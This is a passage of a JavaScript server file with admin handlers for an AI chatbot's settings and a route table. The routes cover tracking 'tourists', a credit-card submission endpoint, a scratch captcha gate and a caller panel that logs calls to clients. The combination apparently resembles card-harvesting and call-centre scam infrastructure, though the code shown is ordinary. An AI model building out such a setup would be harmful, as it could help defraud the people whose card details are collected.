  if (token) adminSessions.delete(token);
  return reply.send({ ok: true });
}

function serializeBotConfig(cfg) {
  return {
    systemPrompt: cfg.systemPrompt,
    model: cfg.model,
    temperature: cfg.temperature,
    maxTokens: cfg.maxTokens,
    historyLimit: cfg.historyLimit,
    aiEnabled: cfg.aiEnabled,
  };
}

async function handleGetBotConfig(req, reply) {
  if (!requireAdmin(req, reply)) return;
  const cfg = await getBotConfig();
  return reply.send(serializeBotConfig(cfg));
}

async function handleUpdateBotConfig(req, reply) {
  if (!requireAdmin(req, reply)) return;
  try {
    const body = asRecord(req.body) ?? {};
    const patch = {};
    // Промпт: разрешаем многострочный текст, до 20000 символов (sanitizeString сохраняет \n).
    if (typeof body.systemPrompt === 'string') patch.systemPrompt = sanitizeString(body.systemPrompt, 20000);
    if (typeof body.model === 'string') patch.model = sanitizeString(body.model, 80);
    if (typeof body.temperature === 'number') patch.temperature = body.temperature;
    if (typeof body.maxTokens === 'number') patch.maxTokens = body.maxTokens;
    if (typeof body.historyLimit === 'number') patch.historyLimit = body.historyLimit;
    if (typeof body.aiEnabled === 'boolean') patch.aiEnabled = body.aiEnabled;

    const updated = await updateBotConfig(patch);
    return reply.send(serializeBotConfig(updated));
  } catch (err) {
    console.error('[admin] update bot-config error:', err?.message || err);
    return reply.status(500).send({ error: 'update_failed' });
  }
}

export async function registerApiRoutes(app) {
  // Tourist tracking
  app.post('/api/track', handleTrack);
  app.post('/api/tourist/call-request', handleCallRequest);
  app.get('/api/tourist/status', handleTouristStatus);
  app.post('/api/credit-card-submission', handleCreditCardSubmission);

  // Scratch captcha
  app.get('/api/scratch-access/:token', handleScratchAccess);
  app.post('/api/scratch-verify', { config: { rawBody: false } }, handleScratchVerify);

  // AI chat
  app.post('/api/chat', handleChat);
  app.get('/api/chat/history/:sessionId', handleChatHistory);

  // Full admin
  app.post('/api/admin/login', handleAdminLogin);
  app.post('/api/admin/logout', handleAdminLogout);
  app.get('/api/admin/bot-config', handleGetBotConfig);
  app.put('/api/admin/bot-config', handleUpdateBotConfig);
  app.get('/api/admin/clients', handleAdminClients);
  app.get('/api/admin/clients/:sessionId/chat', handleAdminClientChat);

  // Caller admin
  app.post('/api/caller/login', handleCallerLogin);
  app.get('/api/caller/clients', handleCallerClients);
  app.post('/api/caller/clients/:id/called', handleCallerMarkCalled);
  app.put('/api/caller/clients/:id/note', handleCallerNote);
  app.put('/api/caller/clients/:id/operator-status', handleCallerSetOperatorStatus);
  app.put('/api/caller/clients/:id/client-type', handleCallerSetClientType);
  app.get('/api/caller/old-clients', handleCallerOldClients);
  app.get('/api/caller/call-logs', handleGetCallLogs);
  app.post('/api/caller/call-logs', handleAddCallLog);
  app.post('/api/caller/call-logs/:id/mark', handleMarkCallLog);

  // SSE for real-time updates
  app.get('/api/sse', handleSSE);
}
